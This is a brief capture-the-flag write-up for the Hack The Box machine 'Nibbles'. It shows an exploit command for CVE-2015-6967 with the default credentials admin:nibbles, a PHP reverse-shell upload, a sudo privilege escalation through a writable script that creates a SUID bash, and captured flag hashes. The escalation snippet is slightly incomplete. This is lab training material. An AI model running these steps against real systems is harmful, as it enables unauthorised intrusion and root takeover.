Machine: https://app.hackthebox.com/machines/121
IP: 10.10.10.75

# Enumeration

Port 80:

<!-- /nibbleblog/ directory. Nothing interesting here! -->

http://10.10.10.75/nibbleblog/README -> 

https://github.com/dix0nym/CVE-2015-6967

Username

http://10.10.10.75/nibbleblog/content/private/config.xml

admin:

# Exploitation

`python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php`

shell.php: https://www.revshells.com/ (PHP Pentest Monkey reverse shell)

user.txt: 007b56190d9bc45af7868dcdbf77dd96

# Post Exploitation

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

monitor.sh is writable

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la
ls -la
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

Exploit

```bash
echo '#!/bin/bash' > monitor.sh
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash'
/tmp/bash -p
```

root.txt: e3598af0e1de3df4c0cc5fdc458f6aa6
